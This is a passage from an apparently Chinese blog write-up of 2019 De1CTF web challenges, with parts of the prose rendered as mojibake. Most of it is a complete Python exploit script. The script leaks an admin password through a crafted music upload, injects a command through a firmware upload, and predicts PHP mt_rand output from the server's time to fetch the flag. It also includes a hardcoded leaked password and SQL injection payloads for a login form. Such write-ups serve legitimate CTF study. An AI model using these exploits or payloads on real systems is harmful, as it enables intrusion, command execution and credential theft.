AAAACAQAAAAAAAAIBAAAAAAAABQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAH4AAAABAAAABgAAAAAAAABwEAAAAAAAAHAQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAACHAAAAAQAAAAYAAAAAAAAAgBAAAAAAAACAEAAAAAAAACsBAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAjQAAAAEAAAAGAAAAAAAAAKwRAAAAAAAArBEAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAJMAAAABAAAAAgAAAAAAAAAAIAAAAAAAAAAgAAAAAAAACQEAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACbAAAAAQAAAAIAAAAAAAAADCEAAAAAAAAMIQAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAqQAAAAEAAAACAAAAAAAAADAhAAAAAAAAMCEAAAAAAAB8AAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAALMAAAAOAAAAAwAAAAAAAAAAPgAAAAAAAAAuAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAC/AAAADwAAAAMAAAAAAAAAED4AAAAAAAAQLgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAywAAAAYAAAADAAAAAAAAABg+AAAAAAAAGC4AAAAAAADAAQAAAAAAAAQAAAAAAAAACAAAAAAAAAAQAAAAAAAAAIIAAAABAAAAAwAAAAAAAADYPwAAAAAAANgvAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADUAAAAAQAAAAMAAAAAAAAAAEAAAAAAAAAAMAAAAAAAADgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA3QAAAAEAAAADAAAAAAAAADhAAAAAAAAAODAAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOMAAAAIAAAAAwAAAAAAAABgQAAAAAAAAEgwAAAAAAAAUAEAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAADoAAAAAQAAADAAAAAAAAAAAAAAAAAAAABIMAAAAAAAABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAaDAAAAAAAAAoBQAAAAAAABoAAAAsAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAJA1AAAAAAAAxAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABUNwAAAAAAAPEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class php_rand():</span><br><span class="line"></span><br><span class="line">    MT_RAND_MT19937 = <span class="number">0</span></span><br><span class="line">    MT_RAND_PHP = <span class="number">1</span></span><br><span class="line">    php_N = <span class="number">624</span></span><br><span class="line">    php_M = <span class="number">397</span></span><br><span class="line">    php_left = <span class="number">0</span></span><br><span class="line">    php_next = <span class="number">0</span></span><br><span class="line">    php_state = [<span class="number">0</span>] * (php_N + <span class="number">1</span>)</span><br><span class="line">    php_mode = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    def __init__(self, seed, <span class="keyword">mode</span>=<span class="number">0</span>):</span><br><span class="line">        self.php_mt_srand(seed)</span><br><span class="line">        self.php_mode = <span class="keyword">mode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def seed(self, seed):</span><br><span class="line">        self.php_mt_srand(seed)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def rand(self):</span><br><span class="line">        <span class="keyword">return</span> self.php_mt_rand()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def hiBit(self, <span class="keyword">u</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">u</span> &amp; <span class="number">0</span>x80000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def loBit(self, <span class="keyword">u</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">u</span> &amp; <span class="number">0</span>x00000001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def loBits(self, <span class="keyword">u</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">u</span> &amp; <span class="number">0</span>x7FFFFFFF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def mixBits(self, <span class="keyword">u</span>, v):</span><br><span class="line">        <span class="keyword">return</span> self.hiBit(<span class="keyword">u</span>) | self.loBits(v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def twist(self, <span class="keyword">m</span>, <span class="keyword">u</span>, v):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">m</span> ^ (self.mixBits(<span class="keyword">u</span>, v) &gt;&gt; <span class="number">1</span>) ^ ((-self.loBit(v)) &amp; <span class="number">0</span>x9908b0df)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def twist_php(self, <span class="keyword">m</span>, <span class="keyword">u</span>, v):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">m</span> ^ (self.mixBits(<span class="keyword">u</span>, v) &gt;&gt; <span class="number">1</span>) ^ ((-self.loBit(<span class="keyword">u</span>)) &amp; <span class="number">0</span>x9908b0df)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def php_mt_initialize(self, seed):</span><br><span class="line">        state = self.php_state</span><br><span class="line">        <span class="keyword">N</span> = self.php_N</span><br><span class="line">        state[<span class="number">0</span>] = seed &amp; <span class="number">0</span>xffffffff</span><br><span class="line">        <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">1</span>, <span class="keyword">N</span>):</span><br><span class="line">            state[i] = (<span class="number">1812433253</span> * (state[i - <span class="number">1</span>] ^ (state[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>)) + i) &amp; <span class="number">0</span>xffffffff</span><br><span class="line">        self.php_state = state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def php_mt_reload(self):</span><br><span class="line">        self.php_left = <span class="number">0</span></span><br><span class="line">        state = self.php_state</span><br><span class="line">        <span class="keyword">N</span> = self.php_N</span><br><span class="line">        M = self.php_M</span><br><span class="line">        <span class="keyword">p</span> = <span class="number">0</span></span><br><span class="line">        i = <span class="keyword">N</span> - M</span><br><span class="line">        <span class="keyword">if</span> self.php_mode == self.MT_RAND_MT19937:</span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                state[<span class="keyword">p</span>] = self.twist(state[<span class="keyword">p</span> + M],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="keyword">p</span> + <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">p</span> += <span class="number">1</span></span><br><span class="line">            i = M - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                state[<span class="keyword">p</span>] = self.twist(state[<span class="keyword">p</span>+M-<span class="keyword">N</span>],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="keyword">p</span> + <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">p</span> += <span class="number">1</span></span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">            state[<span class="keyword">p</span>] = self.twist(state[<span class="keyword">p</span> + M - <span class="keyword">N</span>],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                state[<span class="keyword">p</span>] = self.twist_php(state[<span class="keyword">p</span> + M],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="keyword">p</span> + <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">p</span> += <span class="number">1</span></span><br><span class="line">            i = M - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                state[<span class="keyword">p</span>] = self.twist_php(state[<span class="keyword">p</span> + M - <span class="keyword">N</span>],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="keyword">p</span> + <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">p</span> += <span class="number">1</span></span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">            state[<span class="keyword">p</span>] = self.twist_php(state[<span class="keyword">p</span> + M - <span class="keyword">N</span>],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="number">0</span>])</span><br><span class="line">        self.php_left = <span class="keyword">N</span></span><br><span class="line">        self.php_next = <span class="number">0</span></span><br><span class="line">        self.php_state = state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def php_mt_srand(self, seed):</span><br><span class="line">        self.php_mt_initialize(seed)</span><br><span class="line">        self.php_mt_reload()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def php_mt_rand(self):</span><br><span class="line">        <span class="keyword">if</span> self.php_left == <span class="number">0</span>: self.php_mt_reload()</span><br><span class="line">        self.php_left -= <span class="number">1</span></span><br><span class="line">        s1 = self.php_state[self.php_next]</span><br><span class="line">        s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        s1 ^= (s1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0</span>x9d2c5680</span><br><span class="line">        s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0</span>xefc60000</span><br><span class="line">        self.php_next += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ( s1 ^ (s1 &gt;&gt; <span class="number">18</span>)) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="built_in">get</span> random <span class="built_in">string</span></span><br><span class="line">def rand_str(length=<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.<span class="keyword">join</span>(random.sample(<span class="built_in">string</span>.ascii_letters + <span class="built_in">string</span>.digits, length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="built_in">get</span> method</span><br><span class="line">def <span class="built_in">get</span>(session, url):</span><br><span class="line">    retry = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        retry += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> session:</span><br><span class="line">                r = s.<span class="built_in">get</span>(url, timeout=timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = requests.<span class="built_in">get</span>(url, timeout=timeout)</span><br><span class="line">        excep<span class="variable">t:</span></span><br><span class="line">            <span class="keyword">if</span> retry &gt;= retry_coun<span class="variable">t:</span></span><br><span class="line">                <span class="keyword">print</span>(<span class="string">'timeout or http 500'</span>)</span><br><span class="line">                <span class="keyword">exit</span>()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"># post method</span><br><span class="line">def post(session, url, data, <span class="keyword">files</span>=<span class="string">''</span>):</span><br><span class="line">    retry = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        retry += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> session:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">files</span>==<span class="string">''</span>:</span><br><span class="line">                    r = s.post(url, data=data, timeout=timeout)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = s.post(url, data=data, <span class="keyword">files</span>=<span class="keyword">files</span>, timeout=timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">files</span>==<span class="string">''</span>:</span><br><span class="line">                    r = requests.post(url, data=data, timeout=timeout)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = requests.post(url, data=data, <span class="keyword">files</span>=<span class="keyword">files</span>, timeout=timeout)</span><br><span class="line">        excep<span class="variable">t:</span></span><br><span class="line">            <span class="keyword">if</span> retry &gt;= retry_coun<span class="variable">t:</span></span><br><span class="line">                <span class="keyword">print</span>(<span class="string">'timeout or http 500'</span>)</span><br><span class="line">                <span class="keyword">exit</span>()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"># login with username <span class="built_in">and</span> password</span><br><span class="line">def login(username, password):</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=login'</span></span><br><span class="line">    data = &#123;<span class="string">'username'</span>: username, <span class="string">'password'</span>: password&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="keyword">res</span>.text)</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=upload'</span></span><br><span class="line">    <span class="keyword">res</span> = <span class="built_in">get</span>(<span class="number">1</span>, url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'fileuploaded'</span> not in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line">    <span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line"># <span class="keyword">reg</span> with username <span class="built_in">and</span> password</span><br><span class="line">def <span class="keyword">reg</span>(username, password):</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=reg'</span></span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">res</span> = <span class="built_in">get</span>(<span class="number">1</span>, url)</span><br><span class="line">    show_code = <span class="string">''</span></span><br><span class="line">    show_calc = <span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        show_code = <span class="keyword">res</span>.text.<span class="keyword">split</span>(<span class="string">'show_code"&gt;'</span>)[<span class="number">1</span>].<span class="keyword">split</span>(<span class="string">'&lt;'</span>)[<span class="number">0</span>]</span><br><span class="line">        show_calc = <span class="keyword">res</span>.text.<span class="keyword">split</span>(<span class="string">'show_calc"&gt;'</span>)[<span class="number">1</span>].<span class="keyword">split</span>(<span class="string">'&lt;'</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="built_in">len</span>(show_calc))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(show_calc) != <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'invalid show_calc length'</span>)</span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line">    excep<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="string">"show_code"</span>,show_code)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="string">"show_calc"</span>,show_calc)</span><br><span class="line">    code = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100000000</span>):</span><br><span class="line">        code = str(i)</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(code + show_code).hexdigest()[:<span class="number">6</span>] == show_calc.lower(): <span class="keyword">break</span></span><br><span class="line">    data = &#123;<span class="string">'username'</span>: username, <span class="string">'password1'</span>: password, <span class="string">'password2'</span>: password, <span class="string">'code'</span>: code&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="keyword">res</span>.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line">    <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"># upload music [diff]</span><br><span class="line">def upload_music():</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=upload'</span></span><br><span class="line">    data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">    music = preset_music[:<span class="number">0</span>x6] + <span class="string">'\x00\x00\x03\x00'</span> + preset_music[<span class="number">0</span>x0<span class="variable">a:0x53</span>]</span><br><span class="line">    music += <span class="string">'\x00\x00\x03\x00'</span> + <span class="string">'\x00\x00\x03'</span> + <span class="string">'a'</span> * <span class="number">0</span>x70 + <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">files</span> = &#123;<span class="string">'file_data'</span>: music&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data, <span class="keyword">files</span>)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="keyword">res</span>.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            # n54LuyJyYLVpVO2w</span><br><span class="line">            <span class="keyword">return</span> b64decode(json.loads(<span class="keyword">res</span>.content.strip())[<span class="string">'artist'</span>])[:<span class="number">16</span>]</span><br><span class="line">        excep<span class="variable">t:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"># upload firmware [diff]</span><br><span class="line">def upload_firmware(<span class="keyword">command</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="keyword">command</span>) &gt; <span class="number">0</span>x100: <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=firmware'</span></span><br><span class="line">    data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">    <span class="keyword">command</span> = <span class="keyword">command</span>.ljust(<span class="number">0</span>x100, <span class="string">'\x00'</span>)</span><br><span class="line">    firmware = preset_firmare.replace(<span class="string">'a'</span> * <span class="number">0</span>x100, <span class="keyword">command</span>)</span><br><span class="line">    <span class="keyword">files</span> = &#123;<span class="string">'file_data'</span>: firmware&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data, <span class="keyword">files</span>)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="string">"Upload: "</span> + <span class="keyword">res</span>.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Date'</span> in <span class="keyword">res</span>.headers.<span class="built_in">keys</span>():</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">"Date Header: "</span> + <span class="keyword">res</span>.headers[<span class="string">'Date'</span>])</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">int</span>(datetime.strptime(<span class="keyword">res</span>.headers[<span class="string">'Date'</span>], <span class="string">"%a, %d %b %Y %X %Z"</span>).<span class="built_in">strftime</span>(<span class="string">"%s"</span>)) + time_zone_offset</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">int</span>(time.time())</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"># <span class="built_in">get</span> firmware <span class="keyword">version</span></span><br><span class="line">def firmware_version(path):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">0</span>x40: <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=firmware'</span></span><br><span class="line">    data = &#123;<span class="string">'path'</span>: path&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="keyword">res</span>.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> json.loads(<span class="keyword">res</span>.content.strip())[<span class="string">'info'</span>]</span><br><span class="line">        excep<span class="variable">t:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"># show result</span><br><span class="line">def show_result(vuln1, vuln2, msg):</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> vuln1 == -<span class="number">1</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: unknown.\n'</span></span><br><span class="line">    elif vuln1 == <span class="number">0</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: fail.\n'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: pass.\n'</span></span><br><span class="line">    <span class="keyword">if</span> vuln2 == -<span class="number">1</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: unknown.\n'</span></span><br><span class="line">    elif vuln2 == <span class="number">0</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: fail.\n'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: pass.\n'</span></span><br><span class="line">    result += msg</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"># <span class="built_in">get</span> flag</span><br><span class="line">def get_flag():</span><br><span class="line">    path = <span class="number">0</span></span><br><span class="line">    vuln1 = -<span class="number">1</span></span><br><span class="line">    vuln2 = -<span class="number">1</span></span><br><span class="line">    logined = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> path == <span class="number">0</span>:</span><br><span class="line">        # username = <span class="string">'1Bq2DT3j'</span></span><br><span class="line">        # password = <span class="string">'KWRpkXgHnb'</span></span><br><span class="line">        # # <span class="keyword">res</span> = <span class="keyword">reg</span>(username, password)</span><br><span class="line">        # # <span class="keyword">if</span> not re<span class="variable">s:</span> show_result(vuln1, vuln2, <span class="string">'register fail'</span>)</span><br><span class="line">        # <span class="keyword">res</span> = login(username, password)</span><br><span class="line">        # <span class="keyword">if</span> not re<span class="variable">s:</span> show_result(vuln1, vuln2, <span class="string">'login fail'</span>)</span><br><span class="line">        # time.<span class="keyword">sleep</span>(<span class="number">3</span>)</span><br><span class="line">        # <span class="keyword">res</span> = upload_music()</span><br><span class="line">        # <span class="keyword">if</span> <span class="keyword">res</span> == <span class="string">''</span>:</span><br><span class="line">        #     vuln1 = <span class="number">0</span></span><br><span class="line">        #     show_result(vuln1, vuln2, <span class="string">'leak admin password fail'</span>)</span><br><span class="line">        admin_password = <span class="string">'Mike84eiNxHcMVCz'</span></span><br><span class="line">        <span class="keyword">global</span> s</span><br><span class="line">        s = requests.session()</span><br><span class="line">        <span class="keyword">res</span> = login(<span class="string">'admin'</span>, admin_password)</span><br><span class="line">        <span class="keyword">if</span> not re<span class="variable">s:</span></span><br><span class="line">            vuln1 = <span class="number">0</span></span><br><span class="line">            show_result(vuln1, vuln2, <span class="string">'leak wrong admin password'</span>)</span><br><span class="line">        vuln1 = <span class="number">1</span></span><br><span class="line">    time.<span class="keyword">sleep</span>(<span class="number">3</span>)</span><br><span class="line">    guess_server_time = upload_firmware(<span class="keyword">command</span>)</span><br><span class="line">    <span class="keyword">print</span>(guess_server_time)</span><br><span class="line">    <span class="keyword">if</span> guess_server_time == -<span class="number">1</span>:</span><br><span class="line">        show_result(vuln1, vuln2, <span class="string">'upload fail'</span>)</span><br><span class="line">    vuln2 = <span class="number">0</span></span><br><span class="line">    succ_keyword = <span class="string">'å›ºä»¶ç‰ˆæœ¬å·ï¼š'</span></span><br><span class="line">    <span class="keyword">if</span> vuln2 == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            rander = php_rand(guess_server_time - i)</span><br><span class="line">            path = hashlib.md5(str(rander.rand()) + <span class="string">'[å…¬ç½‘ipåœ°å€]'</span>).hexdigest()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                prev_flag = firmware_version(path).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">            excep<span class="variable">t:</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> succ_keyword in prev_fla<span class="variable">g:</span></span><br><span class="line">                vuln2 = <span class="number">1</span></span><br><span class="line">                prev_flag = prev_flag.replace(succ_keyword, <span class="string">''</span>).strip()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    show_result(vuln1, vuln2, prev_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">argv</span>) != <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"wrong params."</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"example: python %s %s %s"</span> % (<span class="built_in">argv</span>[<span class="number">0</span>], <span class="string">'127.0.0.1'</span>, <span class="string">'80'</span>))</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line">    ip = <span class="built_in">argv</span>[<span class="number">1</span>]</span><br><span class="line">    port = <span class="keyword">int</span>(<span class="built_in">argv</span>[<span class="number">2</span>])</span><br><span class="line">    site_url = <span class="string">'http://%s:%d'</span> % (ip, port)</span><br><span class="line">    get_flag()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-18efb44486672dae.png" alt></p>
<p>æœ‰ä¸ªå°ç»†èŠ‚ï¼Œvpséœ€è¦ç”¨å¯¹åº”æ—¶åŒºçš„åœ°åŒºçš„vpsï¼Œä¸ç„¶ä¼šæœ‰æ—¶é—´å·®â€¦â€¦åˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„.</p>
<h3 id="0x04-Giftbox"><a href="#0x04-Giftbox" class="headerlink" title="0x04 Giftbox"></a>0x04 Giftbox</h3><p><strong>ç¬¬ä¸€å±‚è€ƒç‚¹ï¼šloginå¤„ç›²æ³¨</strong><br>å¤§å‰æï¼Œæœ‰ä¸ªæ—¶é—´æ ¡éªŒï¼Œéœ€è¦ç³»ç»Ÿä¸ºåŒ—äº¬æ—¶é—´ï¼Œç›´æ¥è®¾å®šæ—¶åŒºä¸ºåŒ—äº¬æ—¶åŒºæ¯”è¾ƒæ–¹ä¾¿ã€‚<br>æŸ¥çœ‹view-source:<a href="http://222.85.25.41:8090/js/" target="_blank" rel="noopener">http://222.85.25.41:8090/js/</a>çŸ¥é“pyotp.zipå’Œ&gt;totp.min.jsæ˜¯é‡‡ç”¨äº†åŒå› å­è®¤è¯<br>åœ¨æ­¤å¤„å¾—åˆ°å…³äºåŒå› å­è®¤è¯çš„ä¿¡æ¯view-source:<a href="http://222.85.25.41:8090/js/main.js" target="_blank" rel="noopener">http://222.85.25.41:8090/js/main.js</a><br><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-28490a5764678ae7.png" alt></p>
<p>è¿™ä¸ªä¸œè¥¿åé¢å†™è„šæœ¬æ˜¯TOTPç”¨ï¼Œæµ‹è¯•å‘ç°åœ¨loginå¤„å­˜åœ¨æ³¨å…¥ï¼Œæµ‹è¯•payloadï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">login</span> <span class="keyword">admin</span><span class="string">'/**/and/**/'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span> <span class="keyword">admin</span>   è¿”å›<span class="keyword">login</span> fail, <span class="keyword">password</span> incorrect.</span><br><span class="line"><span class="keyword">login</span> <span class="keyword">admin</span><span class="string">'/**/and/**/'</span><span class="number">1</span><span class="string">'='</span><span class="number">2</span> <span class="keyword">admin</span>   è¿”å›<span class="keyword">login</span> fail, <span class="keyword">user</span> <span class="keyword">not</span> <span class="built_in">found</span>.</span><br></pre></td></tr></table></figure>
